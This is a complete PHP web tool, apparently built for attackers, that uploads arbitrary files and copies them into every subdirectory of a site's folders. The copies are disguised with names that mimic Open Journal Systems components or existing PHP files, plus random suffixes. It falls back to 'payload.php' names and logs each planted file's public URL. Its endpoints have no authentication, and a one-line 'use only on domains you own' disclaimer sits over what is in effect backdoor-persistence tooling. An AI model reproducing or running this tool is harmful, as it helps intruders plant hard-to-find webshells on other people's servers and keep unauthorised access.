<?php
// spread.php — Final version (single file) with peach/pink UI
// Use only on domains you own.

// ---------- CONFIG ----------
$stateFile  = __DIR__ . '/spread_state.json';
$logFile    = __DIR__ . '/spread_log.txt';
$batchSize  = 120; // tasks per batch (tune if needed)
$background = "https://i.gyazo.com/0bddfc9485eee8dae60cbb7be7ea2831.png"; // your bg
$textColor  = "#3a2b2b"; // dark-ish text on peach

// folders to exclude from selection (safety)
$excludeRoots = ['plugins','cache','config','templates_c','.git','public','storage'];

// static OJS-ish base names
$staticNames = ['article','author','editor','review','submission','issue','announcement','gateway','citation','user','notification','search','stats','plugin','helper','service','manager'];

@ini_set('max_execution_time', 900);
@ini_set('memory_limit', '768M');

// ---------- HELPERS ----------
function append_log_line($line) {
    global $logFile;
    $ts = date('Y-m-d H:i:s');
    $entry = "[$ts] $line";
    file_put_contents($logFile, $entry.PHP_EOL, FILE_APPEND | LOCK_EX);
    return $entry;
}

function scan_php_names_from_roots($roots) {
    $names = [];
    foreach ($roots as $r) {
        $rootAbs = realpath(__DIR__ . '/' . $r);
        if (!$rootAbs || !is_dir($rootAbs)) continue;
        $rii = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($rootAbs, FilesystemIterator::SKIP_DOTS));
        foreach ($rii as $f) {
            if ($f->isFile() && strtolower($f->getExtension()) === 'php') {
                $base = $f->getBasename('.php');
                $clean = preg_replace('/\.(inc|class|handler|dao|tpl|incphp)$/i','',$base);
                $clean = preg_replace('/[^a-z0-9]+/i','-', $clean);
                $clean = trim(strtolower($clean), '-');
                if ($clean === '') continue;
                $orig = $clean;
                $i = 1;
                while (in_array($clean, $names)) {
                    $i++;
                    $clean = $orig . $i;
                }
                $names[] = $clean;
            }
        }
    }
    $out = [];
    foreach ($names as $n) {
        $fn = $n . '.php';
        $k = 1;
        while (in_array($fn, $out)) {
            $k++; $fn = $n . $k . '.php';
        }
        $out[] = $fn;
    }
    return $out;
}

function get_all_subdirs($rootAbs) {
    $out = [];
    if (!is_dir($rootAbs)) return $out;
    $rii = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($rootAbs, FilesystemIterator::SKIP_DOTS), RecursiveIteratorIterator::SELF_FIRST);
    foreach ($rii as $p) if ($p->isDir()) $out[] = $p->getPathname();
    return $out;
}

function random_suffix($len=4){
    $chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
    $s = '';
    for ($i=0;$i<$len;$i++) $s .= $chars[random_int(0, strlen($chars)-1)];
    return $s;
}

// ---------- ENDPOINTS ----------

// PREVIEW NAMES (static + dynamic scan)
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action']) && $_POST['action'] === 'previewNames') {
    $roots = $_POST['roots'] ?? [];
    $useStatic = isset($_POST['useStatic']) ? boolval($_POST['useStatic']) : true;
    $useDynamic = isset($_POST['useDynamic']) ? boolval($_POST['useDynamic']) : true;
    $pool = [];
    if ($useStatic) {
        global $staticNames;
        foreach ($staticNames as $s) $pool[] = $s . '.php';
    }
    if ($useDynamic && !empty($roots)) {
        $dyn = scan_php_names_from_roots($roots);
        foreach ($dyn as $d) if (!in_array($d, $pool)) $pool[] = $d;
    }
    echo json_encode(['status'=>'ok','names'=>$pool]);
    exit;
}

// START SPREAD: build tasks (files uploaded in same POST)
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action']) && $_POST['action'] === 'startSpread') {
    $selectedRoots = $_POST['roots'] ?? [];
    $limits = $_POST['limits'] ?? [];
    $mode = $_POST['mode'] ?? 'round'; // 'round' or 'all'
    $useStatic = isset($_POST['useStatic']) ? boolval($_POST['useStatic']) : true;
    $useDynamic = isset($_POST['useDynamic']) ? boolval($_POST['useDynamic']) : true;
    $suffixLen = max(0,intval($_POST['suffixLen'] ?? 4));

    if (empty($_FILES['files']) || empty($_FILES['files']['name'][0])) {
        echo json_encode(['status'=>'error','msg'=>'No files uploaded']);
        exit;
    }

    // build name pool
    $pool = [];
    if ($useStatic) {
        global $staticNames;
        foreach ($staticNames as $s) $pool[] = $s . '.php';
    }
    if ($useDynamic && !empty($selectedRoots)) {
        $dyn = scan_php_names_from_roots($selectedRoots);
        foreach ($dyn as $d) if (!in_array($d, $pool)) $pool[] = $d;
    }
    if (empty($pool)) $pool = ['payload.php','payload2.php','payload3.php'];

    // collect uploaded files into base64
    $uploaded = [];
    foreach ($_FILES['files']['name'] as $i => $nm) {
        if ($_FILES['files']['error'][$i] !== UPLOAD_ERR_OK) continue;
        $tmp = $_FILES['files']['tmp_name'][$i];
        $data = @file_get_contents($tmp);
        if ($data === false) continue;
        $uploaded[] = ['name'=>$nm, 'content'=>base64_encode($data)];
    }
    if (empty($uploaded)) { echo json_encode(['status'=>'error','msg'=>'No readable uploaded files']); exit; }

    // build tasks
    $tasks = [];
    foreach ($uploaded as $file) {
        foreach ($selectedRoots as $rootRel) {
            $rootAbs = realpath(__DIR__ . '/' . $rootRel);
            if (!$rootAbs || !is_dir($rootAbs)) {
                append_log_line("[SKIP] root not found: $rootRel");
                continue;
            }
            $limit = max(0, intval($limits[$rootRel] ?? 0));
            $dirsList = [$rootAbs];
            $sub = get_all_subdirs($rootAbs);
            if (!empty($sub)) $dirsList = array_merge($dirsList, $sub);
            if ($limit > 0) $dirsList = array_slice($dirsList, 0, $limit);

            if ($mode === 'all') {
                foreach ($dirsList as $d) {
                    foreach ($pool as $n) {
                        $name = $n;
                        if ($suffixLen>0) {
                            $dotpos = strrpos($name, '.');
                            $name = substr($name,0,$dotpos) . '_' . random_suffix($suffixLen) . substr($name,$dotpos);
                        }
                        $tasks[] = ['content'=>$file['content'], 'dest'=> $d . DIRECTORY_SEPARATOR . $name, 'src'=>$file['name']];
                    }
                }
            } else {
                foreach ($dirsList as $idx => $d) {
                    $baseName = $pool[$idx % count($pool)];
                    $name = $baseName;
                    if ($suffixLen>0) {
                        $dotpos = strrpos($name, '.');
                        $name = substr($name,0,$dotpos) . '_' . random_suffix($suffixLen) . substr($name,$dotpos);
                    }
                    $tasks[] = ['content'=>$file['content'], 'dest'=> $d . DIRECTORY_SEPARATOR . $name, 'src'=>$file['name']];
                }
            }
        }
    }

    // save state
    $state = ['tasks'=>$tasks, 'index'=>0, 'total'=>count($tasks), 'running'=>true];
    file_put_contents($stateFile, json_encode($state), LOCK_EX);

    // reset log header
    file_put_contents($logFile, "=== SPREAD LOG START " . date('Y-m-d H:i:s') . " ===" . PHP_EOL, LOCK_EX);

    echo json_encode(['status'=>'ok','total'=>count($tasks)]);
    exit;
}

// DO BATCH
if (isset($_GET['doBatch'])) {
    if (!file_exists($stateFile)) { echo json_encode(['error'=>'no_state']); exit; }
    $state = json_decode(file_get_contents($stateFile), true);
    if (!isset($state['tasks'])) { echo json_encode(['error'=>'bad_state']); exit; }
    if (empty($state['running'])) { echo json_encode(['status'=>'stopped']); exit; }

    $tasks = $state['tasks'];
    $i = intval($state['index']);
    $total = count($tasks);
    $done = 0;
    $bs = isset($_GET['batch']) ? max(1,intval($_GET['batch'])) : $batchSize;

    while ($i < $total && $done < $bs) {
        $task = $tasks[$i];$i++; $done++;

        $dest = $task['dest'];
        $dird = dirname($dest);
        if (!is_dir($dird)) @mkdir($dird, 0777, true);

        if (!is_dir($dird) || !is_writable($dird)) {
            append_log_line("[FAILED] $dest (dir not writable or missing)");
            continue;
        }

        $content = base64_decode($task['content']);
        if ($content === false) {
            append_log_line("[FAILED] content decode failed for $dest");
            continue;
        }

        $ok = @file_put_contents($dest, $content);
        if ($ok === false) {
            append_log_line("[FAILED] $dest (write failed)");
            continue;
        }

        $webroot = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS']==='on' ? 'https' : 'http') . '://' . $_SERVER['HTTP_HOST'];
        $real = realpath($dest);
        if ($real !== false && strpos($real, realpath($_SERVER['DOCUMENT_ROOT'])) === 0) {
            $urlPath = str_replace('\\','/', substr($real, strlen(realpath($_SERVER['DOCUMENT_ROOT'])) ));
            $url = rtrim($webroot,'/') . '/' . ltrim($urlPath,'/');
            append_log_line("[OK] $url");
        } else {
            append_log_line("[OK] $dest");
        }
    }

    $state['index'] = $i;
    if ($i >= $total) $state['running'] = false;
    file_put_contents($stateFile, json_encode($state), LOCK_EX);

    echo json_encode(['done'=>$i,'total'=>$total,'running'=>$state['running']]);
    exit;
}

// FETCH LOG
if (isset($_GET['fetchLog'])) {
    if (!file_exists($logFile)) { echo ""; exit; }
    $c = file_get_contents($logFile);
    echo nl2br(htmlspecialchars($c));
    exit;
}

// DOWNLOAD LOG
if (isset($_GET['downloadLog'])) {
    if (!file_exists($logFile)) { http_response_code(404); echo "No log"; exit; }
    header('Content-Type: text/plain');
    header('Content-Disposition: attachment; filename="spread_log.txt"');
    readfile($logFile);
    exit;
}

// STOP
if (isset($_GET['stop'])) {
    if (file_exists($stateFile)) {
        $s = json_decode(file_get_contents($stateFile), true);
        $s['running'] = false;
        file_put_contents($stateFile, json_encode($s), LOCK_EX);
        append_log_line("[INFO] stopped by user");
    }
    echo "ok";
    exit;
}

// ---------- FRONTEND HTML ----------
$availableRoots = array_values(array_filter(glob('*'), 'is_dir'));

// filter exclude roots
$availableRoots = array_values(array_filter($availableRoots, function($d){
    global $excludeRoots;
    return !in_array(basename($d), $excludeRoots);
}));
?>
<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8" />
<title>Spreader — Final (peach theme)</title>
<meta name="viewport" content="width=device-width,initial-scale=1" />
<style>
:root{
  --bg-card: rgba(255,245,240,0.85);
  --peach-1: #ffb7a8;
  --peach-2: #ff8fa3;
  --text-dark: <?= $textColor ?>;
}
*{box-sizing:border-box}
body{
  margin:0;padding:28px;
  font-family: Inter, "Segoe UI", Arial, sans-serif;
  background: url("<?= htmlspecialchars($background) ?>") no-repeat center center fixed;
  background-size:cover;
  color:var(--text-dark);
}
.container{max-width:1200px;margin:0 auto}
.card{background:var(--bg-card);padding:20px;border-radius:14px;box-shadow:0 8px 30px rgba(0,0,0,0.12)}
h1{margin:0 0 8px;color:#9b3d3d}
.small{font-size:13px;color:#6b4b4b}
.grid{display:grid;grid-template-columns:1fr 420px;gap:18px}
.section{padding:12px;background:rgba(255,255,255,0.03);border-radius:8px}
.files-list{max-height:260px;overflow:auto;padding:8px}
.grid-folders{display:grid;grid-template-columns:1fr 1fr;gap:10px}
.folder-card{padding:8px;border-radius:6px;background:rgba(255,255,255,0.02)}
.input-small{width:100%;padding:8px;border-radius:8px;border:0;background:rgba(0,0,0,0.03);color:var(--text-dark)}
.button{background:linear-gradient(90deg,var(--peach-1),var(--peach-2));padding:10px 12px;border-radius:8px;border:0;color:#2b2222;font-weight:700;cursor:pointer}
.controls{display:flex;gap:8px;margin-top:10px;flex-wrap:wrap}
#progressBar{height:20px;background:#eee;border-radius:12px;overflow:hidden;margin-top:10px}
#progressFill{height:100%;width:0;background:linear-gradient(90deg,#ffd1c4,#ff9fb1);text-align:center;color:#2b2222;line-height:20px;font-weight:800}
#log{margin-top:12px;background:#fff;padding:12px;border-radius:8px;height:320px;overflow:auto;font-family:monospace;color:#6b4b4b;white-space:pre-wrap}
.note{font-size:13px;color:#6b4b4b}
.footer{margin-top:12px;font-size:13px;color:#6b4b4b}
@media(max-width:900px){.grid{grid-template-columns:1fr}}
</style>
</head>
<body>
<div class="container">
  <div class="card">
    <h1>SUDAH TINGGAL PAKAI SAJA BIAR CEPAT KIMBEK !</h1>
    <div class="small">Gabungan static + dynamic name generation. Gunakan hanya di server/domain milikmu.</div>

    <div class="grid" style="margin-top:12px">
      <div class="section">
        <label class="small">1) Pilih file (in-memory)</label>
        <input id="fileInput" type="file" multiple>

        <div style="margin-top:10px">
          <label class="small">2) Pilih root folder & set limit per root (0 = semua). Sensitive folders are hidden.</label>
          <div class="grid-folders" id="foldersBox" style="margin-top:8px">
            <?php foreach ($availableRoots as $r): ?>
              <div class="folder-card">
                <label><input type="checkbox" value="<?= htmlspecialchars($r) ?>"> <b><?= htmlspecialchars($r) ?></b></label>
                <div class="small">Limit: <input type="number" min="0" value="0" style="width:80px" data-root="<?= htmlspecialchars($r) ?>"></div>
              </div>
            <?php endforeach; ?>
          </div>
        </div>

        <div style="margin-top:10px">
          <label class="small">3) Name generation</label>
          <div style="display:flex;gap:12px;align-items:center;margin-top:6px">
            <label><input type="checkbox" id="useStatic" checked> Use static list</label>
            <label style="margin-left:6px"><input type="checkbox" id="useDynamic" checked> Use dynamic scan</label>
            <label style="margin-left:12px">Suffix len: <input id="suffixLen" type="number" min="0" value="4" style="width:70px"></label>
          </div>
        </div>

        <div style="margin-top:10px">
          <label class="small">4) Mode</label>
          <select id="modeSelect" class="input-small" style="width:220px;padding:8px">
            <option value="round">Round-robin — 1 name per subdir</option>
            <option value="all">All-in-each — every name in every subdir</option>
          </select>
        </div>

        <div class="controls" style="margin-top:12px">
          <button id="startBtn" class="button">Mulai Sebarkan</button>
          <button id="stopBtn" class="button" style="background:#ffb7b7">Stop</button>
          <button id="refreshLog" class="button" style="background:#fff;color:#2b2222">Refresh Log</button>
          <a id="downloadLog" class="button" style="background:#fff;color:#2b2222;text-decoration:none" href="?downloadLog=1">Download Log</a>
        </div>

        <div id="progressBar"><div id="progressFill">0%</div></div>
        <div class="note">Proses diproses bertahap (batch). Jika banyak folder, harap sabar.</div>
      </div>

      <div class="section">
        <label class="small">Preview uploaded files</label>
        <div id="filesList" class="files-list small">Pilih file di kiri untuk melihat daftar</div>

        <div style="margin-top:10px">
          <label class="small">Preview: generated names (static + dynamic)</label>
          <div id="namePool" class="small" style="margin-top:8px;padding:8px;background:rgba(255,255,255,0.02);border-radius:6px;max-height:240px;overflow:auto"></div>
        </div>
      </div>
    </div>

    <div id="log"><?= file_exists($logFile) ? nl2br(htmlspecialchars(file_get_contents($logFile))) : '' ?></div>
    <div class="footer">Log juga tersimpan di <code>spread_log.txt</code>. Gunakan dengan hati-hati.</div>
  </div>
</div>

<script>
const fileInput = document.getElementById('fileInput');
const filesList = document.getElementById('filesList');
const foldersBox = document.getElementById('foldersBox');
const namePoolBox = document.getElementById('namePool');
const startBtn = document.getElementById('startBtn');
const stopBtn = document.getElementById('stopBtn');
const refreshLog = document.getElementById('refreshLog');
const progressFill = document.getElementById('progressFill');
let batchRunning = false;

fileInput.addEventListener('change', ()=> {
  const list = fileInput.files;
  if (!list || list.length === 0) { filesList.innerHTML = 'Pilih file untuk upload.'; return; }
  let html = '';
  for (let i=0;i<list.length;i++) html += '<div style="margin-bottom:8px">'+escapeHtml(list[i].name)+'</div>';
  filesList.innerHTML = html;
});

function collectRoots() {
  const cards = foldersBox.querySelectorAll('.folder-card');
  const checked = []; const limits = {};
  cards.forEach(c=>{
    const cb = c.querySelector('input[type=checkbox]');
    if (cb && cb.checked) {
      const val = cb.value;
      checked.push(val);
      const lim = c.querySelector('input[type=number]');
      limits[val] = lim ? (lim.value || 0) : 0;
    }
  });
  return {checked, limits};
}

// preview generated name pool
function previewPool() {
  const roots = collectRoots().checked;
  const useStatic = document.getElementById('useStatic').checked;
  const useDynamic = document.getElementById('useDynamic').checked;
  if (!roots.length) { namePoolBox.innerHTML = 'Pilih root untuk preview.'; return; }
  const fd = new FormData();
  fd.append('action','previewNames');
  roots.forEach(r=> fd.append('roots[]', r));
  fd.append('useStatic', useStatic ? '1' : '');
  fd.append('useDynamic', useDynamic ? '1' : '');
  fetch(location.pathname, {method:'POST', body:fd})
    .then(r=>r.json()).then(j=>{
      if (j.status === 'ok') namePoolBox.innerHTML = j.names.length ? j.names.join('<br>') : '(no names found)';
      else namePoolBox.innerHTML = 'Error preview';
    }).catch(e=>namePoolBox.innerText = 'Error preview');
}

foldersBox.addEventListener('change', previewPool);
document.getElementById('useStatic').addEventListener('change', previewPool);
document.getElementById('useDynamic').addEventListener('change', previewPool);
previewPool();

// start spread
startBtn.addEventListener('click', function(){
  const files = fileInput.files;
  if (!files || files.length===0) return alert('Pilih file dulu.');
  const rootsData = collectRoots();
  if (!rootsData.checked.length) return alert('Pilih minimal 1 root folder.');

  const mode = document.getElementById('modeSelect').value;
  const useStatic = document.getElementById('useStatic').checked;
  const useDynamic = document.getElementById('useDynamic').checked;
  const suffixLen = parseInt(document.getElementById('suffixLen').value) || 0;

  const fd = new FormData();
  fd.append('action','startSpread');
  fd.append('mode', mode);
  fd.append('useStatic', useStatic ? '1' : '');
  fd.append('useDynamic', useDynamic ? '1' : '');
  fd.append('suffixLen', suffixLen);

  for (let i=0;i<files.length;i++) fd.append('files[]', files[i]);
  rootsData.checked.forEach(r=> fd.append('roots[]', r));
  for (const k in rootsData.limits) fd.append('limits['+k+']', rootsData.limits[k]);

  fetch(location.pathname, {method:'POST', body:fd})
    .then(r=>r.json()).then(j=>{
      if (j.status === 'ok') {
        batchRunning = true;
        progressFill.style.width='0%'; progressFill.innerText='0%';
        pollBatch(); pollLog(); previewPool();
      } else alert('Error: '+(j.msg||'cannot create tasks'));
    }).catch(e=>alert('Error: '+e));
});

// poll batch
function pollBatch(){
  if (!batchRunning) return;
  fetch('?doBatch=1').then(r=>r.json()).then(j=>{
    if (j.error) { console.error(j); return; }
    const done = j.done||0; const total = j.total||1;
    const percent = Math.round((done/total)*100);
    progressFill.style.width = percent+'%'; progressFill.innerText = percent+'%';
    if (j.running) setTimeout(pollBatch, 700);
    else { batchRunning=false; fetchLog(); alert('Selesai'); }
  }).catch(()=>setTimeout(pollBatch,1500));
}

// poll log
function pollLog(){
  if (!batchRunning) return;
  fetch('?fetchLog=1').then(r=>r.text()).then(t=>{
    document.getElementById('log').innerHTML = t;
    setTimeout(pollLog, 1100);
  }).catch(()=>setTimeout(pollLog,2500));
}

function fetchLog(){ fetch('?fetchLog=1').then(r=>r.text()).then(t=>document.getElementById('log').innerHTML = t); }
refreshLog.addEventListener('click', fetchLog);

// stop
stopBtn.addEventListener('click', function(){
  fetch('?stop=1').then(()=>{ batchRunning=false; alert('Stop requested'); });
});

// helper escape
function escapeHtml(s){ return s.replace(/[&<>"']/g, function(m){return{'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[m];}); }
</script>
</body>
</html>